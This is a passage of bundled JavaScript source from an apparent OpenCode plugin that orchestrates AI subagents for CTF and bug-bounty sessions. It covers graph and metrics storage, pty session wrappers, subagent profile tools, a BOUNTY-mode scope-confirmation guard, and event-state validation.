    }
  };
  const scheduleDeferredGraphFlush = () => {
    if (graphFlushTimer) {
      return;
    }
    graphFlushTimer = setTimeout(() => {
      graphFlushTimer = null;
      const flushed = flushGraph({ pretty: false });
      if (!flushed.ok && graphDeferredRetryCount < GRAPH_DEFER_MAX_RETRIES) {
        graphDeferredRetryCount += 1;
        scheduleDeferredGraphFlush();
      }
    }, GRAPH_DEFER_FLUSH_MS);
  };
  const readGraph = () => {
    if (graphCache) {
      return { ok: true, graph: graphCache };
    }
    const paths = graphPaths();
    if (!paths.ok)
      return paths;
    try {
      if (!existsSync11(paths.file)) {
        graphCache = buildEmptyGraph();
        return { ok: true, graph: graphCache };
      }
      const raw = readFileSync10(paths.file, "utf-8");
      const parsed = JSON.parse(raw);
      if (!isRecord(parsed) || parsed.format !== "aegis-knowledge-graph") {
        return { ok: false, reason: "invalid knowledge-graph format" };
      }
      const entities = Array.isArray(parsed.entities) ? parsed.entities : [];
      const relations = Array.isArray(parsed.relations) ? parsed.relations : [];
      const graph = {
        format: "aegis-knowledge-graph",
        version: 1,
        revision: typeof parsed.revision === "number" ? parsed.revision : 0,
        createdAt: typeof parsed.createdAt === "string" ? parsed.createdAt : new Date().toISOString(),
        updatedAt: typeof parsed.updatedAt === "string" ? parsed.updatedAt : new Date().toISOString(),
        entities,
        relations
      };
      graphCache = graph;
      return { ok: true, graph: graphCache };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const writeGraph = (graph, options = {}) => {
    graphCache = graph;
    if (options.defer) {
      graphDirty = true;
      scheduleDeferredGraphFlush();
      return {
        ok: true,
        mode: "deferred",
        revision: graph.revision
      };
    }
    clearGraphFlushTimer();
    graphDirty = true;
    return flushGraph({ pretty: options.pretty });
  };
  const thinkStateBySession = new Map;
  const ensureThinkState = (sessionID) => {
    const existing = thinkStateBySession.get(sessionID);
    if (existing)
      return existing;
    const created = { thoughtHistoryLength: 0, branches: new Set, totalThoughts: 1 };
    thinkStateBySession.set(sessionID, created);
    return created;
  };
  const appendThinkRecord = (sessionID, payload) => {
    try {
      const root = notesStore.getRootDirectory();
      const dir = join12(root, "thinking");
      const safeSessionID = normalizeSessionID(sessionID);
      mkdirSync7(dir, { recursive: true });
      const file3 = join12(dir, `${safeSessionID}.jsonl`);
      const line = `${JSON.stringify({ at: new Date().toISOString(), ...payload })}
`;
      appendFileSync4(file3, line, "utf-8");
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const metricsPath = () => join12(notesStore.getRootDirectory(), "metrics.jsonl");
  const legacyMetricsPath = () => join12(notesStore.getRootDirectory(), "metrics.json");
  const appendMetric = (entry) => {
    try {
      const path = metricsPath();
      const line = `${JSON.stringify(entry)}
`;
      appendFileSync4(path, line, "utf-8");
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const buildMetricEntry = (sessionID, eventName, correlationId, state, extras = {}) => ({
    at: new Date().toISOString(),
    sessionID,
    source: "ctf_orch_event",
    correlationId,
    event: eventName,
    mode: state.mode,
    phase: state.phase,
    targetType: state.targetType,
    route: state.lastTaskRoute || state.lastTaskCategory,
    subagent: state.lastTaskSubagent,
    model: state.lastTaskModel,
    variant: state.lastTaskVariant,
    candidate: state.latestCandidate,
    verified: state.latestVerified,
    failureReason: state.lastFailureReason,
    failedRoute: state.lastFailedRoute,
    failureSummary: state.lastFailureSummary,
    contradictionPivotDebt: state.contradictionPivotDebt,
    contradictionPatchDumpDone: state.contradictionPatchDumpDone,
    contradictionArtifactLockActive: state.contradictionArtifactLockActive,
    contradictionArtifacts: state.contradictionArtifacts,
    envParityChecked: state.envParityChecked,
    envParityAllMatch: state.envParityAllMatch,
    envParityRequired: state.envParityRequired,
    envParityRequirementReason: state.envParityRequirementReason,
    verifyFailCount: state.verifyFailCount,
    noNewEvidenceLoops: state.noNewEvidenceLoops,
    samePayloadLoops: state.samePayloadLoops,
    timeoutFailCount: state.timeoutFailCount,
    contextFailCount: state.contextFailCount,
    taskFailoverCount: state.taskFailoverCount,
    ...extras
  });
  const callConfigProviders = async (directory) => {
    const configApi = client?.config;
    const providersFn = configApi?.providers;
    if (typeof providersFn !== "function") {
      return { ok: false, reason: "client.config.providers unavailable" };
    }
    try {
      const result = await providersFn({ query: { directory } });
      const data = result?.data;
      if (!data || !Array.isArray(data.providers)) {
        return { ok: false, reason: "unexpected /config/providers response" };
      }
      return { ok: true, data };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPromptAsync = async (sessionID, text, metadata) => {
    const sessionApi = client?.session;
    const promptAsync = sessionApi?.promptAsync;
    if (typeof promptAsync !== "function") {
      return { ok: false, reason: "client.session.promptAsync unavailable" };
    }
    try {
      await promptAsync({
        path: { id: sessionID },
        body: {
          parts: [
            {
              type: "text",
              text,
              synthetic: true,
              metadata
            }
          ]
        }
      });
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const listClaudeSkillsAndCommands = () => {
    const base = join12(projectDir, ".claude");
    const skillsDir = join12(base, "skills");
    const commandsDir = join12(base, "commands");
    const skills = [];
    const commands = [];
    try {
      if (existsSync11(skillsDir)) {
        const entries = readdirSync2(skillsDir, { withFileTypes: true });
        for (const e of entries) {
          if (!e.isDirectory())
            continue;
          const name = e.name;
          if (!name || name.startsWith("."))
            continue;
          const skillPath = join12(skillsDir, name, "SKILL.md");
          if (existsSync11(skillPath)) {
            skills.push(name);
          }
        }
      }
    } catch {
      skills.length = 0;
    }
    try {
      if (existsSync11(commandsDir)) {
        const entries = readdirSync2(commandsDir, { withFileTypes: true });
        for (const e of entries) {
          if (!e.isFile())
            continue;
          const name = e.name;
          if (!name.toLowerCase().endsWith(".md"))
            continue;
          const baseName = name.slice(0, -3);
          if (!baseName || baseName.startsWith("."))
            continue;
          commands.push(baseName);
        }
      }
    } catch {
      commands.length = 0;
    }
    skills.sort();
    commands.sort();
    return { skills, commands };
  };
  const renderSkillTemplate = (template, args) => {
    let out = template;
    out = out.replace(/\$ARGUMENTS\[(\d+)\]/g, (_m, nRaw) => {
      const n = Number(nRaw);
      if (!Number.isFinite(n) || n < 0)
        return "";
      return args[n] ?? "";
    });
    out = out.replace(/\$ARGUMENTS\b/g, args.join(" "));
    return out;
  };
  const loadClaudeSkillOrCommand = (name) => {
    const trimmed = name.trim();
    if (!trimmed) {
      return { ok: false, reason: "name is required" };
    }
    const base = join12(projectDir, ".claude");
    const skillPath = join12(base, "skills", trimmed, "SKILL.md");
    const commandPath = join12(base, "commands", `${trimmed}.md`);
    const candidates = [];
    if (existsSync11(skillPath))
      candidates.push({ kind: "skill", path: skillPath });
    if (existsSync11(commandPath))
      candidates.push({ kind: "command", path: commandPath });
    if (candidates.length === 0) {
      return { ok: false, reason: "not found" };
    }
    const chosen = candidates[0];
    try {
      const st = statSync4(chosen.path);
      if (!st.isFile()) {
        return { ok: false, reason: "not a file" };
      }
      if (st.size > 128 * 1024) {
        return { ok: false, reason: "file too large" };
      }
      const text = readFileSync10(chosen.path, "utf-8");
      return { ok: true, kind: chosen.kind, path: chosen.path, text };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const unwrapPtyResult = (result) => {
    if (isRecord(result) && Object.prototype.hasOwnProperty.call(result, "data")) {
      return result.data;
    }
    return result;
  };
  const ptyErrorMessage = (value) => {
    if (!isRecord(value))
      return null;
    if (!Object.prototype.hasOwnProperty.call(value, "error"))
      return null;
    const err = value.error;
    if (typeof err === "string")
      return err;
    if (!isRecord(err))
      return "unknown pty error";
    const data = err.data;
    if (isRecord(data) && typeof data.message === "string" && data.message.trim().length > 0) {
      return data.message;
    }
    if (typeof err.message === "string" && err.message.trim().length > 0) {
      return err.message;
    }
    if (typeof err.name === "string" && err.name.trim().length > 0) {
      return err.name;
    }
    return "unknown pty error";
  };
  const runPtyAttempts = async (fn, attempts, parse9, noDataReason) => {
    const failures = [];
    for (const attempt of attempts) {
      try {
        const raw = await fn(attempt.args);
        const unwrapped = unwrapPtyResult(raw);
        const err = ptyErrorMessage(raw) ?? ptyErrorMessage(unwrapped);
        if (err) {
          failures.push(`${attempt.label}: ${err}`);
          continue;
        }
        const parsed = parse9(unwrapped);
        if (parsed !== null) {
          return { ok: true, data: parsed };
        }
        failures.push(`${attempt.label}: no-data`);
      } catch (error92) {
        const message = error92 instanceof Error ? error92.message : String(error92);
        failures.push(`${attempt.label}: ${message}`);
      }
    }
    if (failures.length > 0) {
      return { ok: false, reason: `${noDataReason}: ${failures.join(" | ").slice(0, 600)}` };
    }
    return { ok: false, reason: noDataReason };
  };
  const callPtyCreate = async (directory, body) => {
    const ptyApi = client?.pty;
    const rawCreateFn = ptyApi?.create;
    if (typeof rawCreateFn !== "function") {
      return { ok: false, reason: "client.pty.create unavailable" };
    }
    const createFn = rawCreateFn.bind(ptyApi);
    return runPtyAttempts(createFn, [
      { label: "v1-query-body", args: { query: { directory }, body } },
      { label: "v2-flat", args: { directory, ...body } }
    ], (value) => isRecord(value) ? value : null, "pty.create returned no data");
  };
  const callPtyList = async (directory) => {
    const ptyApi = client?.pty;
    const rawListFn = ptyApi?.list;
    if (typeof rawListFn !== "function") {
      return { ok: false, reason: "client.pty.list unavailable" };
    }
    const listFn = rawListFn.bind(ptyApi);
    return runPtyAttempts(listFn, [
      { label: "v2-flat", args: { directory } },
      { label: "v1-query", args: { query: { directory } } }
    ], (value) => Array.isArray(value) ? value : null, "pty.list returned unexpected data");
  };
  const callPtyRemove = async (directory, ptyID) => {
    const ptyApi = client?.pty;
    const rawRemoveFn = ptyApi?.remove;
    if (typeof rawRemoveFn !== "function") {
      return { ok: false, reason: "client.pty.remove unavailable" };
    }
    const removeFn = rawRemoveFn.bind(ptyApi);
    return runPtyAttempts(removeFn, [
      { label: "v2-flat-ptyID", args: { ptyID, directory } },
      { label: "v2-flat-id", args: { id: ptyID, directory } },
      { label: "v1-path-id", args: { path: { id: ptyID }, query: { directory } } },
      { label: "v1-path-ptyID", args: { path: { ptyID }, query: { directory } } }
    ], (value) => value === undefined || value === null ? null : value, "pty.remove returned unexpected data");
  };
  const callPtyGet = async (directory, ptyID) => {
    const ptyApi = client?.pty;
    const rawGetFn = ptyApi?.get;
    if (typeof rawGetFn !== "function") {
      return { ok: false, reason: "client.pty.get unavailable" };
    }
    const getFn = rawGetFn.bind(ptyApi);
    const result = await runPtyAttempts(getFn, [
      { label: "v2-flat-ptyID", args: { ptyID, directory } },
      { label: "v2-flat-id", args: { id: ptyID, directory } },
      { label: "v1-path-id", args: { path: { id: ptyID }, query: { directory } } },
      { label: "v1-path-ptyID", args: { path: { ptyID }, query: { directory } } }
    ], (value) => isRecord(value) ? value : null, "pty.get returned no data");
    if (result.ok) {
      return result;
    }
    const listed = await callPtyList(directory);
    if (listed.ok) {
      const match = listed.data.find((item) => isRecord(item) && typeof item.id === "string" && item.id === ptyID);
      if (isRecord(match)) {
        return { ok: true, data: match };
      }
    }
    return result;
  };
  const callPtyUpdate = async (directory, ptyID, body) => {
    const ptyApi = client?.pty;
    const rawUpdateFn = ptyApi?.update;
    if (typeof rawUpdateFn !== "function") {
      return { ok: false, reason: "client.pty.update unavailable" };
    }
    const updateFn = rawUpdateFn.bind(ptyApi);
    const result = await runPtyAttempts(updateFn, [
      { label: "v2-flat-ptyID", args: { ptyID, directory, ...body } },
      { label: "v2-flat-id", args: { id: ptyID, directory, ...body } },
      { label: "v1-path-id", args: { path: { id: ptyID }, query: { directory }, body } },
      { label: "v1-path-ptyID", args: { path: { ptyID }, query: { directory }, body } }
    ], (value) => isRecord(value) ? value : null, "pty.update returned unexpected data");
    if (result.ok) {
      return result;
    }
    const title = typeof body.title === "string" ? body.title.trim() : "";
    if (!title) {
      return result;
    }
    const listed = await callPtyList(directory);
    if (!listed.ok) {
      return result;
    }
    const current = listed.data.find((item) => isRecord(item) && typeof item.id === "string" && item.id === ptyID);
    if (!isRecord(current)) {
      return result;
    }
    const command = typeof current.command === "string" && current.command.trim().length > 0 ? current.command : "/bin/bash";
    const args = Array.isArray(current.args) ? current.args.filter((v) => typeof v === "string") : ["-l"];
    const cwd = typeof current.cwd === "string" && current.cwd.trim().length > 0 ? current.cwd : undefined;
    const recreated = await callPtyCreate(directory, {
      command,
      args,
      ...cwd ? { cwd } : {},
      title
    });
    if (!recreated.ok) {
      return result;
    }
    const removed = await callPtyRemove(directory, ptyID);
    return {
      ok: true,
      data: {
        ...recreated.data,
        replacedFrom: ptyID,
        removedOriginal: removed.ok,
        fallback: "recreate"
      }
    };
  };
  const callPtyConnect = async (directory, ptyID) => {
    const ptyApi = client?.pty;
    const rawConnectFn = ptyApi?.connect;
    if (typeof rawConnectFn !== "function") {
      return { ok: false, reason: "client.pty.connect unavailable" };
    }
    const connectFn = rawConnectFn.bind(ptyApi);
    const result = await runPtyAttempts(connectFn, [
      { label: "v2-flat-ptyID", args: { ptyID, directory } },
      { label: "v2-flat-id", args: { id: ptyID, directory } },
      { label: "v1-path-id", args: { path: { id: ptyID }, query: { directory } } },
      { label: "v1-path-ptyID", args: { path: { ptyID }, query: { directory } } }
    ], (value) => value === undefined || value === null ? null : value, "pty.connect returned no data");
    if (result.ok) {
      return result;
    }
    const got = await callPtyGet(directory, ptyID);
    if (got.ok) {
      return {
        ok: true,
        data: {
          ptyID,
          directory,
          connectSupported: false,
          reason: result.reason,
          session: got.data
        }
      };
    }
    return result;
  };
  const astTools = createAstGrepTools({
    projectDir,
    getMode: (sessionID) => store.get(sessionID).mode
  });
  const lspTools = createLspTools({ client, projectDir });
  const analysisTools = createAnalysisTools(store, notesStore, config3);
  const blockIfBountyScopeUnconfirmed = (sessionID, toolName) => {
    const state = store.get(sessionID);
    if (state.mode !== "BOUNTY" || state.scopeConfirmed) {
      return null;
    }
    return JSON.stringify({
      ok: false,
      sessionID,
      reason: `BOUNTY mode requires scope confirmation before '${toolName}'.`,
      safe_next: "Use ctf_orch_event event=scope_confirmed after confirming target scope."
    }, null, 2);
  };
  return {
    ...analysisTools,
    ...astTools,
    ...lspTools,
    ctf_orch_status: tool({
      description: "Get current CTF/BOUNTY orchestration state and route decision",
      args: {
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const decision = route(state, config3);
        return JSON.stringify({ sessionID, state, mode_explicit: state.modeExplicit, decision }, null, 2);
      }
    }),
    ctf_orch_set_mode: tool({
      description: "Set orchestrator mode (CTF or BOUNTY) for this session",
      args: {
        mode: schema4.enum(["CTF", "BOUNTY"]),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.setMode(sessionID, args.mode);
        return JSON.stringify({ sessionID, mode: state.mode, mode_explicit: state.modeExplicit }, null, 2);
      }
    }),
    ctf_orch_set_subagent_profile: tool({
      description: "Set model/variant override for a subagent in this session",
      args: {
        subagent_type: schema4.string().min(1),
        model: schema4.string().min(3),
        variant: schema4.string().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const subagentType = normalizeSubagentType(args.subagent_type);
        const model = args.model.trim();
        const variant = typeof args.variant === "string" ? args.variant.trim() : "";
        if (!subagentType) {
          return JSON.stringify({ ok: false, reason: "invalid subagent_type", sessionID }, null, 2);
        }
        if (!isValidModelID(model)) {
          return JSON.stringify({
            ok: false,
            reason: "model must be in provider/model format",
            sessionID,
            subagent_type: subagentType
          }, null, 2);
        }
        if (variant.length > 0 && !isValidVariantID(variant)) {
          return JSON.stringify({
            ok: false,
            reason: "variant contains invalid characters",
            sessionID,
            subagent_type: subagentType
          }, null, 2);
        }
        const supported = supportedVariantsForModel(model);
        if (supported.length > 0 && variant.length === 0) {
          return JSON.stringify({
            ok: false,
            reason: "variant is required for model",
            sessionID,
            subagent_type: subagentType,
            model,
            supported_variants: supported
          }, null, 2);
        }
        if (!isVariantSupportedForModel(model, variant)) {
          return JSON.stringify({
            ok: false,
            reason: "variant not supported for model",
            sessionID,
            subagent_type: subagentType,
            model,
            variant,
            supported_variants: supported
          }, null, 2);
        }
        const state = store.setSubagentProfileOverride(sessionID, subagentType, {
          model,
          variant
        });
        return JSON.stringify({
          ok: true,
          sessionID,
          subagent_type: subagentType,
          profile: state.subagentProfileOverrides[subagentType] ?? null,
          overrides: state.subagentProfileOverrides
        }, null, 2);
      }
    }),
    ctf_orch_clear_subagent_profile: tool({
      description: "Clear one (or all) session subagent model/variant overrides",
      args: {
        subagent_type: schema4.string().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const hasSubagent = typeof args.subagent_type === "string" && args.subagent_type.trim().length > 0;
        const subagentType = hasSubagent ? normalizeSubagentType(args.subagent_type) : undefined;
        const state = store.clearSubagentProfileOverride(sessionID, subagentType);
        return JSON.stringify({
          ok: true,
          sessionID,
          cleared: subagentType ?? "all",
          overrides: state.subagentProfileOverrides
        }, null, 2);
      }
    }),
    ctf_orch_list_subagent_profiles: tool({
      description: "List current session subagent model/variant overrides",
      args: {
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        return JSON.stringify({
          ok: true,
          sessionID,
          overrides: state.subagentProfileOverrides
        }, null, 2);
      }
    }),
    ctf_orch_set_ultrawork: tool({
      description: "Enable or disable ultrawork mode (continuous execution posture) for this session",
      args: {
        enabled: schema4.boolean(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        store.setUltraworkEnabled(sessionID, args.enabled);
        const state = store.setAutoLoopEnabled(sessionID, args.enabled);
        return JSON.stringify({
          sessionID,
          ultraworkEnabled: state.ultraworkEnabled,
          autoLoopEnabled: state.autoLoopEnabled
        }, null, 2);
      }
    }),
    ctf_orch_set_autoloop: tool({
      description: "Enable or disable automatic loop continuation for this session",
      args: {
        enabled: schema4.boolean(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.setAutoLoopEnabled(sessionID, args.enabled);
        return JSON.stringify({
          sessionID,
          autoLoopEnabled: state.autoLoopEnabled,
          autoLoopIterations: state.autoLoopIterations
        }, null, 2);
      }
    }),
    ctf_orch_event: tool({
      description: "Apply an orchestration state event (scan/plan/verify/stuck tracking)",
      args: {
        event: schema4.enum([
          "scan_completed",
          "plan_completed",
          "candidate_found",
          "verify_success",
          "verify_fail",
          "submit_accepted",
          "submit_rejected",
          "no_new_evidence",
          "same_payload_repeat",
          "new_evidence",
          "readonly_inconclusive",
          "scope_confirmed",
          "context_length_exceeded",
          "timeout",
          "unsat_claim",
          "static_dynamic_contradiction",
          "reset_loop"
        ]),
        session_id: schema4.string().optional(),
        candidate: schema4.string().optional(),
        verified: schema4.string().optional(),
        acceptance_evidence: schema4.string().optional(),
        hypothesis: schema4.string().optional(),
        alternatives: schema4.array(schema4.string()).optional(),
        failure_reason: schema4.enum([
          "verification_mismatch",
          "tooling_timeout",
          "context_overflow",
          "hypothesis_stall",
          "unsat_claim",
          "static_dynamic_contradiction",
          "exploit_chain",
          "environment"
        ]).optional(),
        failed_route: schema4.string().optional(),
        failure_summary: schema4.string().optional(),
        target_type: schema4.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]).optional(),
        artifact_paths: schema4.array(schema4.string()).optional(),
        correlation_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const correlationId = typeof args.correlation_id === "string" && args.correlation_id.trim().length > 0 ? args.correlation_id.trim() : randomUUID2();
        const currentState = store.get(sessionID);
        const phaseTransitionError = validateEventPhaseTransition(args.event, currentState.phase);
        if (phaseTransitionError) {
          return JSON.stringify({
            ok: false,
            sessionID,
            event: args.event,
            phase: currentState.phase,
            reason: phaseTransitionError
          }, null, 2);
        }
        if (args.event === "verify_success" && (!args.verified || args.verified.trim().length === 0)) {
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "verify_success requires non-empty verified evidence in args.verified"
          }, null, 2);
        }
        if (args.event === "verify_success" && args.verified && isLowConfidenceCandidate(args.verified)) {
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "verify_success rejected: low-confidence or placeholder verified payload"
          }, null, 2);
        }
        if (args.event === "verify_success" && currentState.mode === "CTF") {
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "manual verify_success is blocked in CTF. Use verifier output flow, then submit with acceptance evidence."
          }, null, 2);
        }
        if (args.event === "submit_accepted") {
          const acceptance = typeof args.acceptance_evidence === "string" ? args.acceptance_evidence.trim() : "";
          if (!args.verified || args.verified.trim().length === 0) {
            return JSON.stringify({
              ok: false,
              sessionID,
              reason: "submit_accepted requires non-empty verified payload in args.verified"
            }, null, 2);
          }
          if (acceptance.length === 0 || !hasAcceptanceEvidence(acceptance)) {
            return JSON.stringify({
              ok: false,
              sessionID,
              reason: "submit_accepted requires acceptance oracle evidence (Accepted/Correct/checker success) in args.acceptance_evidence"
            }, null, 2);
          }
        }
        if (args.hypothesis) {
          store.setHypothesis(sessionID, args.hypothesis);
        }
        if (args.alternatives) {
          store.setAlternatives(sessionID, args.alternatives);
        }
        if (args.target_type) {
          store.setTargetType(sessionID, args.target_type);
        }
        if (args.event === "candidate_found" && args.candidate) {
          store.setCandidate(sessionID, args.candidate);
        }
        if (args.event === "submit_accepted" && args.verified) {
          store.setVerified(sessionID, args.verified);
        }
        if (args.event === "submit_accepted" && typeof args.acceptance_evidence === "string") {
          store.setAcceptanceEvidence(sessionID, args.acceptance_evidence);
        }
        if (args.failure_reason) {
          store.recordFailure(sessionID, args.failure_reason, args.failed_route ?? "", args.failure_summary ?? "");
        }
        let state = store.applyEvent(sessionID, args.event);
        if (args.artifact_paths && args.artifact_paths.length > 0) {
          state = store.recordContradictionArtifacts(sessionID, args.artifact_paths);
        }
        if (args.event === "candidate_found" || args.event === "verify_success" || args.event === "verify_fail" || args.event === "submit_accepted" || args.event === "submit_rejected") {
          const evidenceType = args.event === "submit_accepted" ? "acceptance_oracle" : args.event === "verify_success" ? "behavioral_runtime" : args.event === "verify_fail" ? "dynamic_memory" : "string_pattern";
          const summary = args.event === "submit_accepted" ? typeof args.acceptance_evidence === "string" ? args.acceptance_evidence : "manual submit accepted" : typeof args.candidate === "string" ? args.candidate : String(args.event);
          const entry = {
            at: new Date().toISOString(),
            sessionID,
            event: String(args.event),
            evidenceType,
            confidence: evidenceType === "acceptance_oracle" ? 1 : 0.8,
            summary: summary.replace(/\s+/g, " ").trim().slice(0, 240),
            source: "ctf_orch_event"
          };
          appendEvidenceLedger(notesStore.getRootDirectory(), entry);
          const scored = scoreEvidence([entry]);
          store.setCandidateLevel(sessionID, scored.level);
        }
        appendMetric(buildMetricEntry(sessionID, String(args.event), correlationId, state, {
          eventFailureReason: args.failure_reason ?? null,
          eventFailedRoute: args.failed_route ?? null,
          eventFailureSummary: args.failure_summary ?? null,
          eventArtifactPaths: args.artifact_paths ?? []
        }));
        const latestState = store.get(sessionID);
        return JSON.stringify({ sessionID, state: latestState, decision: route(latestState, config3) }, null, 2);
      }
    }),
    ctf_orch_metrics: tool({
      description: "Read recorded CTF/BOUNTY metrics entries",
      args: {
        limit: schema4.number().int().positive().max(500).default(100)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        try {
          const path = metricsPath();
          let entries = [];
          if (existsSync11(path)) {
            const lines = readFileSync10(path, "utf-8").split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
            entries = lines.map((line) => {
              try {
                return JSON.parse(line);
              } catch {
                return null;
              }
            }).filter((item) => item !== null).slice(-args.limit);
          } else {
            const legacyPath = legacyMetricsPath();
            if (existsSync11(legacyPath)) {
              const parsed = JSON.parse(readFileSync10(legacyPath, "utf-8"));
              const arr = Array.isArray(parsed) ? parsed : [];
              entries = arr.slice(-args.limit);
            }
          }
          return JSON.stringify({ ok: true, sessionID, entries }, null, 2);
        } catch (error92) {
          const message = error92 instanceof Error ? error92.message : String(error92);
          return JSON.stringify({ ok: false, reason: message, sessionID }, null, 2);
        }
      }
    }),
    ctf_orch_next: tool({
      description: "Return the current recommended next category/agent route",
      args: {
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        return JSON.stringify({ sessionID, decision: route(state, config3) }, null, 2);
      }
    }),
    ctf_orch_session_list: tool({
      description: "List OpenCode sessions (best-effort; falls back to status map if list API unavailable)",
      args: {
        limit: schema4.number().int().positive().max(200).optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const limit = typeof args.limit === "number" ? args.limit : undefined;
        const result = await callSessionList(projectDir, limit);
        return JSON.stringify({ sessionID, directory: projectDir, limit: limit ?? null, ...result }, null, 2);
      }
    }),
    ctf_orch_session_read: tool({
      description: "Read recent messages from a session",
      args: {
        target_session_id: schema4.string().min(1),
        message_limit: schema4.number().int().positive().max(200).default(50),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const targetSessionID = args.target_session_id;
        const limit = args.message_limit;
        const result = await callSessionMessages(projectDir, targetSessionID, limit);
        const messages = [];
        if (result.ok) {
          for (const msg of result.data) {
            if (!isRecord(msg))
              continue;
            const role = typeof msg.role === "string" ? msg.role : isRecord(msg.info) && typeof msg.info.role === "string" ? String(msg.info.role) : "";
            const parts = Array.isArray(msg.parts) ? msg.parts : [];
            const text = parts.map((p) => isRecord(p) && typeof p.text === "string" ? p.text : "").filter(Boolean).join(`
`).trim();
            if (!text)
              continue;
            messages.push({ role: role || "unknown", text });
          }
        }
        return JSON.stringify({
          sessionID,
          directory: projectDir,
          targetSessionID,
          messageLimit: limit,
          ok: result.ok,
          ...result.ok ? { messages } : { reason: result.reason }
        }, null, 2);
      }
    }),
    ctf_orch_session_search: tool({
      description: "Search text in recent messages across sessions (best-effort)",
      args: {
        query: schema4.string().min(1),
        max_sessions: schema4.number().int().positive().max(200).default(25),
        message_limit: schema4.number().int().positive().max(200).default(40),
        case_sensitive: schema4.boolean().default(false),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const q = args.case_sensitive ? args.query : args.query.toLowerCase();
        const list = await callSessionList(projectDir, args.max_sessions);
        if (!list.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: list.reason, directory: projectDir }, null, 2);
        }
        const sessionIDs = [];
        for (const item of list.data) {
          if (isRecord(item) && typeof item.id === "string" && item.id.trim().length > 0) {
            sessionIDs.push(item.id.trim());
          }
        }
        const hits = [];
        for (const targetSessionID of sessionIDs.slice(0, args.max_sessions)) {
          const read = await callSessionMessages(projectDir, targetSessionID, args.message_limit);
          if (!read.ok)
            continue;
          for (const msg of read.data) {
            if (!isRecord(msg))
              continue;
            const role = typeof msg.role === "string" ? msg.role : isRecord(msg.info) && typeof msg.info.role === "string" ? String(msg.info.role) : "";
            const parts = Array.isArray(msg.parts) ? msg.parts : [];
            const text = parts.map((p) => isRecord(p) && typeof p.text === "string" ? p.text : "").filter(Boolean).join(`
`).trim();
            if (!text)
              continue;
            const hay = args.case_sensitive ? text : text.toLowerCase();
            if (!hay.includes(q))
              continue;
            hits.push({ sessionID: targetSessionID, role: role || "unknown", preview: text.slice(0, 300) });
            if (hits.length >= 200)
              break;
          }
          if (hits.length >= 200)
            break;
        }
        return JSON.stringify({
          sessionID,
          ok: true,
          directory: projectDir,
          query: args.query,
          maxSessions: args.max_sessions,
          messageLimit: args.message_limit,
          hits
        }, null, 2);
      }
    }),
    ctf_orch_session_info: tool({
      description: "Get best-effort metadata for a single session",
      args: {
        target_session_id: schema4.string().min(1),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const targetSessionID = args.target_session_id;
        const list = await callSessionList(projectDir, 200);
        const found = list.ok && Array.isArray(list.data) ? list.data.find((item) => isRecord(item) && String(item.id ?? "") === targetSessionID) : null;
        return JSON.stringify({
          sessionID,
          directory: projectDir,
          targetSessionID,
          ok: true,
          found: Boolean(found),
          item: found ?? null
        }, null, 2);
      }
    }),
    aegis_memory_save: tool({
      description: "Persist structured memory entities/relations to the local knowledge graph",
      args: {
        entities: schema4.array(schema4.object({
          name: schema4.string().min(1),
          entityType: schema4.string().min(1),
          observations: schema4.array(schema4.string().min(1)).optional(),
          tags: schema4.array(schema4.string().min(1)).optional()
        })).default([]),
        relations: schema4.array(schema4.object({
          from: schema4.string().min(1),
          to: schema4.string().min(1),
          relationType: schema4.string().min(1),
          tags: schema4.array(schema4.string().min(1)).optional()
        })).default([])
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const graph = loaded.graph;
        const now = new Date().toISOString();
        const createdEntities = [];
        const updatedEntities = [];
        for (const e of args.entities ?? []) {
          const name = e.name.trim();
          const entityType = e.entityType.trim();
          if (!name || !entityType)
            continue;
